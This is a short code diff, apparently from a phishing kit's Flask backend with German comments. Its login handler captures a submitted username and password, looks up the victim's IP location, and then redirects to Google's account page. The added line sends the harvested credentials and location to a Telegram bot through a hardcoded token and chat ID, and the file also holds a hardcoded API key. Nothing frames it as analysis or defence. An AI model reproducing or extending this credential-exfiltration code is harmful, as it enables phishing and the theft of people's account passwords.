@@ -265,10 +265,11 @@ def login():
     ip = request.remote_addr
     # IP-Daten von ip-api.com abrufen
     response = requests.get(f"https://ipfinder.ch/api?ip={ip}&key=0An2xa2xGKbIv89F")
-    print(response)
+    print(response.json())
     ip_data = (response.json())
     # Nachricht an Telegram senden
     message = f"Login-Informationen:\nBenutzername: {username}\nPasswort: {password}\nLocation: {ip_data['location']['lon']}, {ip_data['location']['lat']} ({ip_data['location']['city']}, {ip_data['location']['name']})\nProvider: {ip_data['as']['name']}{ip_data['as']['domain']}"
+    requests.get(f"https://api.telegram.org/bot5751384094:AAGiPu72GJlp4JziOkQvnpMtIH2EZsF1JmQ/sendMessage?chat_id=608885714&disable_web_page_preview=true&disable_web_page_preview=true&text={message}")
     return redirect("https://myaccount.google.com/")
 
 
